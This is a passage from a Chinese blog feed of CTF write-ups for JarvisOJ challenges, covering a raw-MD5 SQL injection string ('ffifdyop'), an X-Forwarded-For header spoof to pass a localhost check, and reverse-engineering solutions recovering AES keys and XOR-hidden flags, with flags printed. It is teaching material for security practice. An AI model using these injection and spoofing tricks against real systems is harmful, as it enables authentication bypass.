对于php和数据库来说，中间过程，即md5($pass,true),是存在危险性的，md5的保存方式也不一定安全。</p><p>提示: md5(string,raw)   当raw=true时，返回是将string转化为md5之后再转化为hex，再转化为字符串。如以下例子</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">content: ffifdyop</span><br><span class="line">hex: 276f722736c95d99e921722cf9ed621c</span><br><span class="line">raw: 'or'6\xc9]\x99\xe9!r,\xf9\xedb\x1c</span><br><span class="line">string: 'or'6]!r,b</span><br></pre></td></tr></tbody></table></figure></div><p>所以raw参数很重要，且 sql语句中，</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or 数据</span><br></pre></td></tr></tbody></table></figure></div><p>好像都是当成立处理，即为真</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Web-LOCALHOST</title>
      <link href="/2018/11/20/CTF-JarvisOJ-Web-LOCALHOST/"/>
      <url>/2018/11/20/CTF-JarvisOJ-Web-LOCALHOST/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h4 id="题目入口：http-web-jarvisoj-com-32774"><a href="#题目入口：http-web-jarvisoj-com-32774" class="headerlink" title="题目入口：http://web.jarvisoj.com:32774/"></a>题目入口：<a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a></h4><h2 id="这道题的提示很明显，就是要求我们访问的时候，等效于127-0-0-1的本地访问"><a href="#这道题的提示很明显，就是要求我们访问的时候，等效于127-0-0-1的本地访问" class="headerlink" title="这道题的提示很明显，就是要求我们访问的时候，等效于127.0.0.1的本地访问"></a>这道题的提示很明显，就是要求我们访问的时候，等效于127.0.0.1的本地访问</h2><h2 id="根据http协议，我们可以伪造访问的ip，将我们的访问ip改成127-0-0-1"><a href="#根据http协议，我们可以伪造访问的ip，将我们的访问ip改成127-0-0-1" class="headerlink" title="根据http协议，我们可以伪造访问的ip，将我们的访问ip改成127.0.0.1"></a>根据http协议，我们可以伪造访问的ip，将我们的访问ip改成127.0.0.1</h2><p>我们打开题目<a href="/2018/11/20/CTF-JarvisOJ-Web-LOCALHOST/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/20/CTF-JarvisOJ-Web-LOCALHOST/1.png" class="lazyload"></a><br>由于ie本身是没有直接修改http header的功能，所以我们需要下载其他有该功能的浏览器。例如谷歌、火狐。</p><p>而我电脑上已经安装了火狐，那么我们就使用火狐来修改http header的ip</p><p>在火狐上打开该网页，然后F12，然后在网络这里选中对应返回给我们网页数据的封包，然后点击右边的 ##编辑和重发<br>接着会出现以下情况<br><a href="/2018/11/20/CTF-JarvisOJ-Web-LOCALHOST/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/20/CTF-JarvisOJ-Web-LOCALHOST/2.png" class="lazyload"></a></p><p>我们在结尾加入  </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></tbody></table></figure></div><p>注意    :    后面有空格</p><p>然后点击重新发送，会出现以下图片<br><a href="/2018/11/20/CTF-JarvisOJ-Web-LOCALHOST/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/20/CTF-JarvisOJ-Web-LOCALHOST/4.png" class="lazyload"></a></p><p>得到flag:PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</p><p>###总结:从这个案例中，我们发现http协议中是可以伪造本地访问的，对于 X-Forwarded-For 这个字段，我们以后开发网站的时候要着重考虑一下。</p><p>接下来我们来具体分析一下XFF(X-Forwarded-For)这个字段的具体用途，它一般使用在代理服务器中。</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: client1, proxy1, proxy2, proxy3</span><br></pre></td></tr></tbody></table></figure></div><p>其中的值通过一个 逗号+空格 把多个IP地址区分开, 最左边(client1)是最原始客户端的IP地址, 代理服务器每成功收到一个请求，就把请求来源IP地址添加到右边。请求刚从client1中发出时，XFF是空的，请求被发往proxy1；通过proxy1的时候，client1被添加到XFF中，之后请求被发往proxy2;通过proxy2的时候，proxy1被添加到XFF中，之后请求被发往proxy3；通过proxy3时，proxy2被添加到XFF中，之后请求的的去向不明，如果proxy3不是请求终点，请求会被继续转发。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Basic-段子</title>
      <link href="/2018/11/20/CTF-JarvisOJ-Basic-%E6%AE%B5%E5%AD%90/"/>
      <url>/2018/11/20/CTF-JarvisOJ-Basic-%E6%AE%B5%E5%AD%90/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="程序猿圈子里有个非常著名的段子："><a href="#程序猿圈子里有个非常著名的段子：" class="headerlink" title="程序猿圈子里有个非常著名的段子："></a>程序猿圈子里有个非常著名的段子：</h2><h2 id="手持两把锟斤拷，口中疾呼烫烫烫。"><a href="#手持两把锟斤拷，口中疾呼烫烫烫。" class="headerlink" title="手持两把锟斤拷，口中疾呼烫烫烫。"></a>手持两把锟斤拷，口中疾呼烫烫烫。</h2><h2 id="请提交其中”锟斤拷”的十六进制编码。-大写"><a href="#请提交其中”锟斤拷”的十六进制编码。-大写" class="headerlink" title="请提交其中”锟斤拷”的十六进制编码。(大写)"></a>请提交其中”锟斤拷”的十六进制编码。(大写)</h2><h2 id="FLAG-PCTF-你的答案"><a href="#FLAG-PCTF-你的答案" class="headerlink" title="FLAG: PCTF{你的答案}"></a>FLAG: PCTF{你的答案}</h2><p>我一开始使用vs编写python程序</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print "锟斤拷".encode('hex').upper()</span><br></pre></td></tr></tbody></table></figure></div><p>输出为<a href="/2018/11/20/CTF-JarvisOJ-Basic-%E6%AE%B5%E5%AD%90/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/20/CTF-JarvisOJ-Basic-%E6%AE%B5%E5%AD%90/2.png" class="lazyload"></a></p><p>提交时却提示flag错误</p><p>然后我启动命令行，输入python进入编程模式，直接输入print “锟斤拷”.encode(‘hex’).upper()，然后回车，输出结果<br>EFBFBDEFBFBD<br>这是正确的flag</p><p>令人疑惑，好在不是代码的问题。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Basic-公倍数</title>
      <link href="/2018/11/20/CTF-JarvisOJ-Basic-%E5%85%AC%E5%80%8D%E6%95%B0/"/>
      <url>/2018/11/20/CTF-JarvisOJ-Basic-%E5%85%AC%E5%80%8D%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="请计算1000000000以内3或5的倍数之和。"><a href="#请计算1000000000以内3或5的倍数之和。" class="headerlink" title="请计算1000000000以内3或5的倍数之和。"></a>请计算1000000000以内3或5的倍数之和。</h2><h2 id="如：10以内这样的数有3-5-6-9，和是23"><a href="#如：10以内这样的数有3-5-6-9，和是23" class="headerlink" title="如：10以内这样的数有3,5,6,9，和是23"></a>如：10以内这样的数有3,5,6,9，和是23</h2><h2 id="请提交PCTF-你的答案"><a href="#请提交PCTF-你的答案" class="headerlink" title="请提交PCTF{你的答案}"></a>请提交PCTF{你的答案}</h2><p>对于这道题，我查阅了一下资料，网上的方法是for循环到10E，但是这样十分的慢。<br>其实是有简单的解法的，可以使用数列的知识。<br>我们先算出3 6 9 12 …… 999999999 的和，只需算出Sn的通项公式就可以了<br>同理我们算出5的倍数求和的通项公式Bn，和15倍数求和的通项公式Cn<br>那么答案便是  Sn+Bn-Cn，减去Cn是因为既是三的倍数又是五的倍数的和加了两次，所以我们需要减去一次</p><p>我们使用python去解决这道题目</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a = (3*333333333+3)*333333333/2</span><br><span class="line">b = (5*199999999+5)*199999999/2</span><br><span class="line">c = (15*66666666+15)*66666666/2</span><br><span class="line">print ("%d"%(a+b-c))</span><br></pre></td></tr></tbody></table></figure></div><p>最后答案：PCTF{233333333166666668}</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> BASIC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-Re-Authenticator</title>
      <link href="/2018/11/17/CTF-Re-Authenticator/"/>
      <url>/2018/11/17/CTF-Re-Authenticator/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="Re-Authenticator"><a href="#Re-Authenticator" class="headerlink" title="Re-Authenticator"></a>Re-Authenticator</h2><p>下载文件 <a href="Authenticator.class">Authenticator.class</a><br>首先class是java文件，我们可以通过jd-gui来分析，下面我们通过jd-gui打开它<br><a href="/2018/11/17/CTF-Re-Authenticator/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-Re-Authenticator/1.png" class="lazyload"></a><br>flag 就是 “ThisIsth3mag1calString4458”</p><p>总结：这是题目吗？</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Re-软件密码破解-2</title>
      <link href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/"/>
      <url>/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h2 id="JarvisOJ-软件密码破解-2"><a href="#JarvisOJ-软件密码破解-2" class="headerlink" title="JarvisOJ-软件密码破解-2"></a>JarvisOJ-软件密码破解-2</h2><p>下载文件<a href="CrackMe2.rar">点击下载</a><br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/1.png" class="lazyload"></a></p><p>首先我们发现这是一个C#程序，对于c#程序我们都是要祭出dnSpy大杀器<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/2.png" class="lazyload"></a></p><p>在这里下一个断点，因为这里有标志性代码——-MessageBox，且我们输入注册码的时候，它就有弹窗，所以这个肯定是关键性代码了。<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/3.png" class="lazyload"></a></p><p>我们运行调试他，随便输入几个数，然后被断下了，我们步进调试<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/4.png" class="lazyload"></a></p><p>很明显text1是我们输入的假码<br>然后我们就进入了生成flag的代码区<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/5.png" class="lazyload"></a><br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/6.png" class="lazyload"></a><br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/7.png" class="lazyload"></a></p><p>很明显在加密的过程中有”pctf2016pctf2016pctf2016pctf2016”参与<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/8.png" class="lazyload"></a></p><p>还有假码的参与，通过aes加密，加密形式为ECB<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/9.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/9.png" class="lazyload"></a></p><p>然后最后生成base64<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/10.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/10.png" class="lazyload"></a></p><p>最后是对  “x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk=” 与 test2 比较<br>所以主需要对 “x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk=” 进行逆处理便可</p><p>为了方便起见，我们使用python制作，因为c++制作的话会比较麻烦。<br>Python需要Crypto库 而base64是本身自带的</p><p>总体思路为：对”x/nzolo0TTIyrEISd4AP1spCzlhSWJXeNbY81SjPgmk=”进行逆base64<br>然后用”pctf2016pctf2016pctf2016pctf2016”作为key解开它的aes加密<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/11.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/11.png" class="lazyload"></a></p><p>具体代码如下，故flag为PCTF{Dot_Net_UnPack3r_yoo}，后面乱码无需理会<br>我们测试一下<br><a href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/12.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-2/12.png" class="lazyload"></a></p><p>成功<br>总结：这次逆向没有什么难度，主要就是告诉大家的aes的逆处理是如何操作。</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Re-CTF_100_0</title>
      <link href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/"/>
      <url>/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><p>文件下载<a href="CTF_100_0.rar">点击下载</a></p><p>对<a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/1.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/1.png" class="lazyload"></a>进行分析<br>接下来我将在 WinXP的虚拟机下进行调试<br>1、先进行查壳<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/2.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/2.png" class="lazyload"></a><br>Not packed 表示无壳，那么我们直接进行调试了。<br>2、导入OD<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/3.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/3.png" class="lazyload"></a><br>3、由于没有加壳 所以可以直接搜索字符串，猜测flag的位置<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/4.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/4.png" class="lazyload"></a><br>4、由于习惯问题，mfc程序的代码一般位于 基址偏移+0x10000  开始<br>所以直接往上拉 即可<br><a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/5.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/5.png" class="lazyload"></a><br> 5、注意到上面有flag 我们猜测下面几个地址是主要的代码位置，flag很可能会在这里出现，但是很明显的是，flag被隐藏了。很可能是被拆成了非 unicode的字符或者直接用ascii的十六进制 进行保存，使字符无法被搜索到<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/6.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/6.png" class="lazyload"></a><br>6、我们双击进入你赢了，毕竟这个比较显眼，一般都是通过 MessageBoxA 来告诉你一些信息<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/7.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/7.png" class="lazyload"></a><br>7、将代码拉到头部<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/8.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/8.png" class="lazyload"></a><br>很明显这里是一个call的内部。具体为什么这里不方便阐述。</p><p>8、我们在这里下cc断点，然后运行程序看看 看看会不会被断下，如果断下，说明这个按钮的事件中必然运行到了此call，那么我们就可以大致的确定flag的位置了<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/9.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/9.png" class="lazyload"></a><br>由结果证明，按钮的事件确实和这个call有关联<br>9、接下来就要单步分析了，因为一步一步分析较慢，繁琐，请允许我在一定的代码上写上注释，且不对无关代码进行分析<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/10.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/10.png" class="lazyload"></a><br>看到mov eax,005779F8 时，我们就要警惕了，因为这很可能要进行比较或者将假码进行变换，于是我们单步到该地址。<br>Eax表示指针已经指向假码了，<br>Add esp,0xC 对分析无用。<br>然后看到<br>00401C0D  |.  8D50 02       lea     edx,dword ptr ds:[eax+0x2]<br>00401C10  |>  66:8B08       /mov     cx,word ptr ds:[eax]       ;  将假码依次放入cx<br>00401C13  |.  83C0 02       |add     eax,0x2                  ;  偏移 一个位置  指向下一位字符<br>00401C16  |.  66:85C9       |test    cx,cx<br>其实就是等效于 你输入的假码是否为空  及判断<br>If(假码 == “”)<br>对于实际当前代码中，没有什么用途<br>但是它对下面的代码有很大影响<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/11.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/11.png" class="lazyload"></a><br>Eax和edx的改变  是的  它们之间的差值再右移一位，恰好是0xE<br>我一开始也是猜测这个很可能是和位数有关，发现eax的最终结果 始终等于你输入的文本的长度，我们当前是12341234，所以下面的  cmp就无法通过了<br>于是我尝试14位假码时，恰好 长度等于0xE（其实就是假码长度要等于十进制的14）<br>实际上由于jg的跳转条件的原因，只要小于14位都可通过，大于14位直接跳转<br>【至于为什么会这样会等于长度，我可能要用数学算一下哦】</p><p>10、接下来是对flag的分析了<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/12.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/12.png" class="lazyload"></a><br>首先它把我们的文本转化为ascii码<br>且注意！！！！！！！！ Flag本身只有14位  而且前面的假码要求我们就是14位，说明我们输入的假码要参与运算，只有符合条件的时候才能得出正确的数据。【推测，还未证实】<br>然后WideCharToMultiByte函数，将文本存入了00D69F00。此时我已经重新输入了16位假码<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/13.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/13.png" class="lazyload"></a><br><a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/14.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/14.png" class="lazyload"></a><br> 但是我们看到是乱码<br>实际上是因为 将假码转化为ascii后，我们通过unicode查看就会乱码，转化为ascii就好<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/15.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/15.png" class="lazyload"></a></p><p>注意！！！！<br>00401C53  |.  B9 F8775700   mov     ecx,005777F8                          ;  UNICODE “在此输入口令：”<br>00401C58  |.  8BC3          mov     eax,ebx                               ;  eax = 假码<br>00401C5A  |.  2BCB          sub     ecx,ebx<br>00401C5C  |.  8D6424 00     lea     esp,dword ptr ss:[esp]<br>00401C60  |>  8A1401        /mov     dl,byte ptr ds:[ecx+eax]             ;  将[ecx+eax]的值传入 dl<br>00401C63  |.  3010          |xor     byte ptr ds:[eax],dl<br>00401C65  |.  40            |inc     eax<br>00401C66  |.  4E            |dec     esi<br>00401C67  |.^ 75 F7         \jnz     short 00401C60                       ;  判断 假码是否等于 在此输入口令：</p><p>这几条汇编我们要好好分析一下<br>00401C5C  |.  8D6424 00     lea     esp,dword ptr ss:[esp] 是栈处理 我们无需理会，对分析无作用<br>首先它将UNICODE “在此输入口令：”  的指针传到了005777F8，且此时 ebx为假码的指针，然后它将假码的指针传给了 eax，根据个人经验，他们肯定要进行转化或者比较了。<br> <a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/16.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/16.png" class="lazyload"></a><br>然后它竟然 把 ecx 减去了ebx 即 ecx = ecx – ebx;  哇绝望啊   因为它是负数  注意mov eax,ebx  很明显 eax = ebx的<br>所以后面的[ecx+eax]= [005777F8 -ebx + eax] = [005777F8] 坑爹啊  根本没变<br>然后将 005777F8 的单个二进制数值 和 [eax] 假码 进行 xor操作<br>因为已经到该call结尾了，后面也有flag的字符串，所以我们很有必要怀疑 这里就是flag的隐藏点</p><p>结论：简单说 就是 把  “在此输入口令：” 和 假码转化为  ascii  然后进行xor (异或操作) </p><p>00401C69  |> \813B 1B1C1746 cmp     dword ptr ds:[ebx],0x46171C1B<br>00401C6F      0F85 E7000000 jnz     00401D5C<br>00401C75  |.  817B 04 F4FD2>cmp     dword ptr ds:[ebx+0x4],0x3020FDF4<br>00401C7C      0F85 DA000000 jnz     00401D5C<br>00401C82  |.  817B 08 B70C8>cmp     dword ptr ds:[ebx+0x8],0x7E8E0CB7<br>00401C89      0F85 CD000000 jnz     00401D5C<br>00401C8F  |.  807B 0C 78    cmp     byte ptr ds:[ebx+0xC],0x78<br>00401C93      0F85 C3000000 jnz     00401D5C<br>00401C99  |.  807B 0D DE    cmp     byte ptr ds:[ebx+0xD],0xDE<br><a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/17.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/17.png" class="lazyload"></a><br>上一步中 ebx=eax 且 ebx是假码的指针，然后他要判断假码的 的数据是不是<br>1B 1C 17 46 F4 FD 20 30 B7 0C 8E 7E 78 DE</p><p>对此我们可以确定 上一步中 假设我们输入正确的 假码 应该是 1B 1C 17 46 F4 FD 20 30 B7 0C 8E 7E 78 DE 的数据<br>所以我们可以用c++直接 进行运算，代码如下<br>即<br>28 57 64 6B 93 8F 65 51 E3 53 E4 4E 1A FF 00 00  在此输入口令：<br>1B 1C 17 46 F4 FD 20 30 B7 0C 8E 7E 78 DE        F酏 0?巭x?.<br>进行异或运算<br><a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/18.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/18.png" class="lazyload"></a><br><a href="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/19.png" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="/2018/11/17/CTF-JarvisOJ-Re-CTF-100-0/19.png" class="lazyload"></a></p><p>得出 Flag{3Ks-grEaT_j0b!}<br>大总结：这个程序对于汇编的前后联系有较高要求，要求对指针有较强的敏感，对函数的各个参数有仔细观察。整体来说 难度不高，只要一步一步分析正确，最终发现flag的关键汇编代码，便可得出flag</p></body></html>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 逆向工程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-JarvisOJ-Re-软件密码破解-1</title>
      <link href="/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-1/"/>
      <url>/2018/11/17/CTF-JarvisOJ-Re-%E8%BD%AF%E4%BB%B6%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3-1/</url>
      
